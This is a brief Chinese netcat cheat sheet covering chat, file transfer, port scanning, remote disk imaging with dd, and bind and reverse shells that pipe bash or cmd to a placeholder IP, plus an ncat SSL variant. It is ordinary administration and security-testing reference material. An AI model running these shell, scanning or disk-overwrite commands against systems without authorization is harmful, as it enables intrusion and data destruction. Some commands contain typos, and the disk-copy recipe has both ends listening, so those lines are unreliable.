### 聊天/信息传递
Server: 
>nc -l -p 4444 
Client: 
>nc -nv IP 4444 
### 电子取证
Server： 
>nc-l -p 4444 > remote.txt 
Client： -q 表示完成后多少秒后退出 
>ls-l | nc -nv IP 4444 -q 1   

### 文件传输
Server: 接收文件 
>nc -lp 4444 > 1.mp3
Client: 发送文件 
>nc -nv IP 4444 < 1.mp3 -q 1 
### 目录传输
Server: 接收文件 
>tar -cvf - music/ | nc -lp 4444 -q 1
Client: 发送文件 
>nc -nv IP 4444 | tar -xvf - 

### 端口扫描（作为辅助参考，不一定准确，结合其他工具，例如nmap）
TCP 端口：
>nc -nvz IP 1-65535  
UDP 端口： 
>nc -nvzu IP 1-65535 

### 远程硬盘拷贝（用于电子取证，删除文件还原）
远程接收
>nc -lp 4444 | dd of=/dev/sda1
被拷贝 
>dd if=/dev/sda | nc -lp 4444 -q 1 

### 远程控制
正向： 
>nc -lp 4444 -c bash 
>nc IP 4444
反向： 
>nc -lp 4444
>nc IP 4444 -c bash 
如果是Windows，将bash换成cmd 

### NC缺乏加密和身份验证功能， 用ncat 来替换
>ncat -c bash --allow ClientIP -nvl 4444 --ssl
>ncat -nv ServerIP 4444 --ssl


